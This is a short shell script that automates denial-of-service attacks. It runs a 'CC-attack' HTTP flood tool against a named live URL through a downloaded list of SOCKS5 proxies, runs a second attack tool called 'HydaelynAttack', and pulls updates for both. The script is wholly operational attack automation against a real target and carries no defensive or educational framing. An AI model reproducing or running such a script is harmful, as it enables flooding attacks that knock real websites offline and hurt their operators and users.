echo "CC-attack"
python3 ~/Nyaa-Automata/CC-attack/cc.py -url http://fwe22.top/ -f ~/Nyaa-Automata/proxy.txt -v 5 -s 30

echo ""
echo "HydaelynAttack"
python3 ~/Nyaa-Automata/HydaelynAttack/HydaelynAttack_p_once_noLog.py

echo ""
echo "updata proxy"
curl https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt -o proxy.txt

echo ""
echo "updata HydaelynAttack"
cd HydaelynAttack
git pull
cd ..

echo ""
echo "updata CC-attack"
cd CC-attack
git pull
cd ..

echo ""
echo "Nyaa-Automata"
git pull
